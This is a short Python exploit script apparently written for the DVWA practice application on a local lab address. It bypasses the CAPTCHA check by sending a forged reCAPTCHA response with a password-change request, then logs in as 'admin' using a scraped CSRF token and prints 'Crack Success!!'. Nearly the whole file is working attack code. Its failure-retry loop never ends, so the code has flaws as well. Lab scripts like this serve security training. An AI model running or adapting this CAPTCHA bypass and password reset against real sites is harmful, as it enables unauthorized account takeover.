import requests
from bs4 import BeautifulSoup as bs
import sys
from time import sleep

def captcha(password):
    data = {
            "step":"2",
            "password_new":password,
            "password_conf":password,
            "g-recaptcha-response":"03",
            "Change":"Change"
            }
    URL="http://10.0.2.13:8080/vulnerabilities/captcha/"
    req = session1.post(URL,cookies=cookie,data=data)

def login(password):
    account={
            "username":"admin",
            "password":password,
            "Login":"Login"
            }
    URL="http://10.0.2.13:8080/login.php"
    while(1):
        token = session2.get(URL,cookies=cookie)
        login_html = token.text
        html_parser = bs(login_html,'html.parser')
        user_token = html_parser.find('input',{'name':'user_token'})
        login_data = {**account, **{'user_token':user_token['value']}}
        login = session2.post(URL,cookies=cookie,data=login_data)
        if(login.text.find("login_logo.png")==-1):
            print("\n\n")
            print("Crack Success!!"+str("admin")+"/"+str(password))
            print("\n\n")
            exit(0)
        else:
            print("\n\n")
            print("Crack Failed!!")
            print("\n\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: {} <new password>".format(sys.argv[0]))
        exit(0)
    else:
        session1=requests.Session()
        session2=requests.Session()
        cookie={
                "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
                "security":"low"
                }

captcha(sys.argv[1])
login(sys.argv[1])
